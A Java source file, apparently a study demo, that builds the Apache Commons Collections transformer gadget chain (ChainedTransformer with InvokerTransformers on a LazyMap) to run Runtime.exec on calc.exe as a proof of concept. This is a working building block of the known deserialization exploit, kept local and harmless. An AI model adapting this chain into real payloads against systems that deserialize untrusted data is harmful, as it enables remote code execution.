package demo.LazyMap;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;

public class Lazy1 {
    public static void main(String[] args){
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class },
                        new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class },
                        new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class },
                        new Object[] {"calc.exe"})
        };
        //create chain
        Transformer transformerChain = new ChainedTransformer(transformers);
        //LazyMap
        HashMap hashMap = new HashMap();
        LazyMap lazyM = (LazyMap) LazyMap.decorate(hashMap, transformerChain);
        //poc
        lazyM.get("foo");
    }
}
